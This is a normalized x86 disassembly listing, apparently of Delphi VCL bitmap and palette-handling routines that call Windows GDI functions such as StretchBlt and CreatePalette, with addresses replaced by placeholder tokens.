mov [ esp + 0x4 ] 0x300
movzx eax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_428100
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_4275f4
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4282fb
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_424960
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_424960
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_424960
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4282b3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_427a38
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_42830c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_425afc
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_427864
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_428374
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax esi
call sub_428b7c
mov eax [ esi + 0x28 ]
call sub_427868
mov eax [ esi + 0x2c ]
call sub_403f64
mov edx ebx
and dl 0xfc
mov eax esi
call sub_416d9c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_4283b0
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_428b7c
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_428472
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_403728
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_428dec
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_427864
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_427868
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
movzx eax [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
movzx eax [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416dc8
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_4284ac
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_428b7c
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42853c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_42809c
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_427a38
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
movzx eax [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_428dec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_428541
mov eax [ ebp - 0x8 ]
call sub_4227d0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_404800
call sub_404854
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_42856c
push ebx
mov ebx eax
mov eax ebx
call sub_428860
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_40f8bc
pop ebx
retn
sub_42859c
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_419344
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_428b7c
lea eax [ ebx + 0x2c ]
call sub_40f8bc
push esp
mov eax [ ebx + 0x28 ]
movzx eax [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_428dec
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_428610
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
movzx edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_424638
mov eax ebx
call sub_428c8c
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_42899c
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_42884e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_42455c
push eax
call SetStretchBltMode
mov eax ebx
call sub_4288e0
movzx edx [ r-xdata ]
call sub_424638
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_428c2c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_4288e0
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428855
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4287e3
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_424960
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_4288e0
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_424b10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_428860
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_428b8c
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4284ac
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_4248b8
sub_4288e0
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_428b8c
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_427670
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_42856c
sub_428928
push ebx
mov ebx eax
mov eax ebx
call sub_428b7c
mov eax ebx
call sub_428b8c
mov edx ebx
mov eax ebx
call sub_42856c
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_42894c
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_4289cc
push ebx
push esi
mov esi eax
mov bl 0x8
mov eax esi
call sub_42894c
cmp al 0x1
jne r-xdata
mov eax [ esi + 0x28 ]
lea edx [ eax + 0x18 ]
lea eax [ edx + 0x18 ]
movzx ecx [ eax + 0xe ]
cmp ecx 0x10
jg r-xdata
xor ebx ebx
jmp r-xdata
sub ecx 0x18
je r-xdata
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x6
jmp r-xdata
sub ecx 0x8
je r-xdata
mov eax [ eax + 0x10 ]
sub eax 0x1
jb r-xdata
dec ecx
je r-xdata
cmp [ eax + 0x10 ] 0x0
jne r-xdata
jmp r-xdata
mov bl 0x4
jmp r-xdata
sub eax 0x2
je r-xdata
mov bl 0x1
jmp r-xdata
sub ecx 0x3
je r-xdata
mov bl 0x7
cmp [ edx + 0x44 ] 0x7e0
jne r-xdata
jmp r-xdata
mov bl 0x2
jmp r-xdata
sub ecx 0x4
je r-xdata
mov bl 0x5
jmp r-xdata
mov bl 0x3
jmp r-xdata
jmp r-xdata
sub_428a50
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_42856c
mov eax [ ebx + 0x28 ]
add eax 0x18
mov ebp eax
lea esi [ eax + 0x18 ]
test edi edi
jl r-xdata
mov eax [ rw-data ]
call sub_424810
cmp edi [ ebp + 0x8 ]
jl r-xdata
movzx edx [ esi + 0xe ]
mov ecx 0x20
mov eax [ esi + 0x4 ]
call sub_424af0
imul edi
add eax [ ebp + 0x14 ]
mov ebx eax
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
sub eax edi
dec eax
mov edi eax
mov eax ebx
call sub_428b08
call GdiFlush
mov eax [ esi + 0x8 ]
test eax eax
jle r-xdata
sub_428ab8
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_423140
mov eax ebx
call sub_42899c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_4288e0
xor edx edx
pop ecx
call sub_4244e8
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_428b08
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_428c8c
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_427a38
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
movzx ecx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_428b8c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_4192e0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_428c0f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_428c2c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_428b7c
mov eax ebx
call sub_428b8c
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_428ab8
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_428100
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_4275f4
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_428c8c
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
movzx ecx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_425058
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_4275f4
push 0x0
call GetDC
call sub_424960
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_428d44
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_424828
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_4284ac
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_428b7c
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_403728
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_428dc8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_4192c0
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_429484
pop esi
pop ebx
retn
sub_428dec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_428e74
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
movzx edx [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_404114
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_428ed4
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_427868
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_427864
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428edb
push rw-data
call LeaveCriticalSection
retn
sub_428eec
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_429484
pop edx
pop edi
pop esi
pop ebx
retn
sub_428f14
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_402d28
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_429435
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_429408
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_403728
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
movzx edx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
movzx edx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_424840
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
movzx eax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_41955c
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_403728
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
movzx eax [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_4194ec
mov eax [ ebx + 0x20 ]
movzx edx [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
movzx eax [ ebx + 0xe ]
call sub_424ad0
mov [ ebx + 0x20 ] eax
